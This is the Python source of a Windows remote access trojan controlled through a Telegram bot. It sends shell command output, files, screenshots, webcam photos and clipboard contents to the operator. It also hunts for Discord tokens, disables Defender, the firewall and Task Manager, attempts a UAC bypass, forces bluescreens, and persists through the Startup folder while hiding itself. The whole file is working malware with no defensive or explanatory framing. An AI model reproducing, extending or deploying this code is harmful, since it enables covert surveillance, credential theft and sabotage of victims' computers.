import requests
import subprocess
import os
import pyautogui
import time
import pyperclip
import ctypes
import shutil
import psutil
import webbrowser
import datetime
import sys
import tempfile

BOT_TOKEN = "urbottoken"
CHAT_ID = urchatid  
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

current_dir = os.getcwd()

def send_output(text):
    url = f"{TELEGRAM_API}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text[:4000]}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def send_file(filepath, caption=""):
    url = f"{TELEGRAM_API}/sendDocument"
    try:
        with open(filepath, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID, "caption": caption[:1000]}
            requests.post(url, data=data, files=files, timeout=10)
        os.remove(filepath)
    except:
        pass

def get_updates(offset):
    url = f"{TELEGRAM_API}/getUpdates"
    params = {"offset": offset, "timeout": 10}
    try:
        r = requests.get(url, params=params, timeout=15)
        return r.json()
    except:
        return {"ok": False, "result": []}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def show_message(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Message", 0)
    send_output("[+] Message shown")

def speak(text):
    try:
        from win32com.client import Dispatch
        sp = Dispatch("SAPI.SpVoice")
        sp.Speak(text)
        send_output("[+] Spoken")
    except:
        send_output("[-] pywin32 not installed")

def block_input(state):
    if not is_admin():
        send_output("[-] Admin required")
        return
    ctypes.windll.user32.BlockInput(state)
    send_output("[+] Input blocked" if state else "[+] Input unblocked")

def wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(path), 0)
        send_output("[+] Wallpaper changed")
    except:
        send_output("[-] Wallpaper failed")

def disable_defender():
    if not is_admin():
        send_output("[-] Admin required")
        return
    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
    send_output("[+] Defender disabled")

def disable_firewall():
    if not is_admin():
        send_output("[-] Admin required")
        return
    subprocess.run('netsh advfirewall set allprofiles state off', shell=True)
    send_output("[+] Firewall disabled")

def geolocate():
    try:
        r = requests.get('https://ipinfo.io/json', timeout=5)
        data = r.json()
        loc = data.get('loc', '0,0').split(',')
        url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
        send_output(f"IP: {data.get('ip')}\nLocation: {url}")
    except:
        send_output("[-] Geolocate failed")

def grab_tokens():
    tokens = []
    discord_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\discordcanary\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\discordptb\Local Storage\leveldb"
    ]
    for path in discord_paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            if 'mfa.' in data:
                                tokens.append(f"Token found in {file}")
                    except:
                        pass
    send_output(str(tokens) if tokens else "No tokens found")

def get_cams():
    cams = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cams.append(str(i))
            cap.release()
    send_output(f"Available cams: {', '.join(cams)}" if cams else "No cams found")

selected_cam = 0

def webcam_pic():
    global selected_cam
    try:
        import cv2
        cap = cv2.VideoCapture(selected_cam)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            send_file("webcam.jpg", caption="Webcam photo")
        else:
            send_output("[-] Camera failed")
        cap.release()
    except:
        send_output("[-] OpenCV not installed")

def bluescreen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, 0)
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, 0)
    except:
        os.system('taskkill /f /im winlogon.exe')

def critical_process():
    if not is_admin():
        send_output("[-] Admin required")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    send_output("[+] Process is critical")

def uncritical_process():
    if not is_admin():
        send_output("[-] Admin required")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    send_output("[+] Process is not critical")

def disable_taskmgr():
    if not is_admin():
        send_output("[-] Admin required")
        return
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    send_output("[+] Task Manager disabled")

def enable_taskmgr():
    if not is_admin():
        send_output("[-] Admin required")
        return
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
    send_output("[+] Task Manager enabled")

def add_startup():
    try:
        startup = os.path.expanduser("~") + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\telegram_rat.pyw"
        shutil.copy(__file__, startup)
        send_output("[+] Added to startup")
    except:
        send_output("[-] Startup failed")

def hide_self():
    subprocess.run(f'attrib +h {__file__}', shell=True)
    send_output("[+] Hidden")

last_update = 0

while True:
    try:
        updates = get_updates(last_update + 1)
        if updates.get("ok") and updates.get("result"):
            for update in updates["result"]:
                last_update = update["update_id"]
                cmd = update.get("message", {}).get("text", "")
                
                if not cmd.startswith("!"):
                    continue
                    
                send_output(f"[*] Executing: {cmd[:50]}")
                
                # File transfers
                if cmd == "!screenshot":
                    pyautogui.screenshot("ss.png")
                    send_file("ss.png", "Screenshot")
                
                elif cmd.startswith("!shell "):
                    out = subprocess.getoutput(cmd[6:])
                    send_output(out[:3500] if out else "[+] Done")
                
                elif cmd == "!currentdir":
                    send_output(os.getcwd())
                
                elif cmd.startswith("!cd "):
                    try:
                        os.chdir(cmd[4:])
                        send_output(f"[+] Changed to {os.getcwd()}")
                    except Exception as e:
                        send_output(f"[-] {str(e)}")
                
                elif cmd == "!dir":
                    try:
                        items = "\n".join(os.listdir())
                        send_output(items[:3500] if items else "Empty directory")
                    except Exception as e:
                        send_output(f"[-] {str(e)}")
                
                elif cmd.startswith("!download "):
                    path = cmd[10:]
                    if os.path.exists(path):
                        send_file(path, os.path.basename(path))
                    else:
                        send_output("[-] File not found")
                
                elif cmd.startswith("!delete "):
                    try:
                        os.remove(cmd[8:])
                        send_output("[+] Deleted")
                    except Exception as e:
                        send_output(f"[-] {str(e)}")
                
                elif cmd.startswith("!message "):
                    show_message(cmd[9:])
                
                elif cmd.startswith("!write "):
                    pyautogui.write(cmd[7:])
                    send_output(f"[+] Typed: {cmd[7:30]}...")
                
                elif cmd == "!clipboard":
                    try:
                        content = pyperclip.paste()
                        send_output(content[:3500] if content else "[-] Empty clipboard")
                    except:
                        send_output("[-] Clipboard failed")
                
                elif cmd == "!admincheck":
                    send_output(f"Admin: {is_admin()}")
                
                elif cmd == "!listprocess":
                    procs = "\n".join([p.name() for p in psutil.process_iter()])
                    send_output(procs[:3500])
                
                elif cmd.startswith("!prockill "):
                    name = cmd[10:]
                    os.system(f'taskkill /f /im {name}')
                    send_output(f"[+] Killed {name}")
                
                elif cmd == "!shutdown":
                    os.system("shutdown /s /t 30")
                    send_output("[+] Shutting down in 30s")
                
                elif cmd == "!restart":
                    os.system("shutdown /r /t 30")
                    send_output("[+] Restarting in 30s")
                
                elif cmd == "!logoff":
                    os.system("shutdown /l")
                
                elif cmd == "!bluescreen":
                    bluescreen()
                
                elif cmd == "!datetime":
                    send_output(str(datetime.datetime.now()))
                
                elif cmd == "!geolocate":
                    geolocate()
                
                elif cmd == "!startup":
                    add_startup()
                
                elif cmd == "!hide":
                    hide_self()
                
                elif cmd == "!exit":
                    send_output("[+] Exiting RAT")
                    sys.exit(0)
                
                elif cmd.startswith("!wallpaper "):
                    wallpaper(cmd[11:])
                
                elif cmd == "!disabledefender":
                    disable_defender()
                
                elif cmd == "!disablefirewall":
                    disable_firewall()
                
                elif cmd == "!grabtokens":
                    grab_tokens()
                
                elif cmd == "!getcams":
                    get_cams()
                
                elif cmd == "!webcampic":
                    webcam_pic()
                
                elif cmd == "!critproc":
                    critical_process()
                
                elif cmd == "!uncritproc":
                    uncritical_process()
                
                # UAC bypass
                elif cmd == "!uacbypass":
                    subprocess.run('reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "cmd.exe" /f', shell=True)
                    subprocess.run('reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f', shell=True)
                    subprocess.run('start computerdefaults.exe', shell=True)
                    send_output("[+] UAC bypass attempted")
                
                else:
                    send_output("[-] Unknown command")
        
        time.sleep(1)
    except Exception as e:
        send_output(f"[-] Loop error: {str(e)[:100]}")
        time.sleep(3)